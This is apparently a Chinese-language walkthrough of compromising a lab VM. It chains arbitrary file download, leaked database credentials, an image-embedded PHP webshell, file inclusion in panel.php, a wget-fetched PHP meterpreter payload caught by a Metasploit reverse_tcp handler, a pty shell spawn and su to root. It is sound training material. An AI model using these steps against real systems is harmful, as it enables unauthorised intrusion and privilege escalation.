# 渗透过程

按照惯例先nmap扫描网段，得到靶机IP为 `192.168.40.140`

![](../Images/b9798bc35b06752f87b48cd4f5ad4c1e.png)

得到IP后，访问网页，发现只有登录框，没有什么意外的东西，扫描一下后台目录，看看有没有什么文件可利用的，扫描完后，发现有一堆php，同时还有一个phpmy(phpmyadmin)的网页

![](../Images/dcc9c07ec8b54f696fa5fb916fd0a70b.png)

都访问了一遍后，发现test.php需要传入一个file的参数，用 `GET型`的方式试了一下，发现不行

![](../Images/fe16e4d53166c504126963788caaa09b.png)

换火狐浏览器，开hackbar，发送 `POST数据`

![](../Images/25b36a8669d9823cf2ee981f97f9e062.png)

 发现可以任意文件下载，把所有文件都下载下来后，发现 `c.php`文件里面有数据库密码，是用来访问phpmyamdin的(至于为什么不是index.php的登录用户，试一试能不能登录就知道了，要是能登录我也懒得去phpmyadmin)

![](../Images/61b5fd2665f307b11f4a23f08400ecad.png)

登录phpmyadmin后，在 `ica_lab.auth`表中找到另外一个用户名密码

![](../Images/4e53040dead68c40cd712516115c7953.png)

拿上面那个账号密码成功登录

![](../Images/ce0f43855cc46b838e526796cfae79ff.png)

在登录后的界面找到了上传点

![](../Images/ed97e73c2584fbc83dd0f624e32d7238.png)

看路径得到php文件名为 `panel.php`，回到火狐浏览器下载源码，代码乱审计了一波，发现 `panel.php`中有文件包含的漏洞，接下来的操作用人话说就是，通过文件包含把php语句包含到panel.php中，然后执行命令

![](../Images/b6011ca3f7502be4fb705b9726ec99f0.png)

  

上传一张正常的图片，然后通过burpsuite在图片中插入一句话木马（也可以外面修改完后上传）

![](../Images/7efffd22c13353f847f19e4ee4d2113c.png)

完事后，在 `panel.php`页面中点击continue生成流量包，通过改 `load`这个参数的内容来把我 `Elapse.jpg`文件中的php语句包含进去

![](../Images/631ad8c707ba54fcb9ecff15fea496fd.png)

这样panel.php就相当于是一个木马文件了，给它一个elapse的参数执行命令试一下

![](../Images/e0997441a9dd8453c12bbddae4cffdb8.png)

成功执行，那么为了方便我这里多余一步，将 `uploaded_images`下的Elapse.jpg改为 `Elapse.php`，这样方便点，因为burpsuite中，需要手动url编码，也就是空格需要写成%20，太麻烦辽

![](../Images/452fffee2ca3de356b2b9d5917778f6b.png)

更改完后，就可以直接去uploaded\_images目录下利用Elapse.php了，这个时候就得想个法子来反弹shell了，那么就又到了我就喜欢了生成Php木马的时间了

![](../Images/bc58e774573b7057095959d57db16a60.png)

生成完后，还需要改个后缀，因为是Php的话，会直接执行了，这样一来对方在wget尝试下载的时候就会下载不到本体，所以需要改为 `.txt`或者其他格式，改完后开起apache2就好了

![](../Images/756043f7514fe74e241addda37ae298f.png)

回到靶机这边，用wget将php木马下载下来

![](../Images/16de68eab41a770121da7e6b71c606bc.png)

下载成功后，改个后缀为php

![](../Images/a2dc8095da6780918875a83acb0f81c9.png)

改完后，去到kali里面，用handler模块来触发payload

```
1.  `root@Elapse:/var/www/html# msfconsole `
    
2.  `msf > use exploit/multi/handler `
    
3.  `msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp`
    
4.  `payload => php/meterpreter/reverse_tcp`
    
5.  `msf exploit(multi/handler) > set lhost 192.168.40.129`
    
6.  `lhost => 192.168.40.129`
    
7.  `msf exploit(multi/handler) > set lport 4123`
    
8.  `lport => 4123`
    
9.  `msf exploit(multi/handler) > exploit `
    
10.  
     
11.  `[*] Started reverse TCP handler on 192.168.40.129:4123 `
     
```

完事后，在浏览器这边输入链接触发木马

![](../Images/34a3dc734b70b8ba7f4847f3240e6cd4.png)

触发成功辽，**tql **

 输入 `shell`进入系统，输入 `python-c'import pty; pty.spawn("/bin/bash")'`来转到终端

然后在系统里面一顿找文件的操作，才想起来，phpmy路径下会有一个config.inc.php，回过头来访问一下，就很简单的找到了root密码

![](../Images/b4eca314d6a92723c0f27633097d6dd4.png)

尝试性的su root后，不小心就变成root用户了

![](../Images/5016b7aa1627445c599d2a76bb75741f.png)
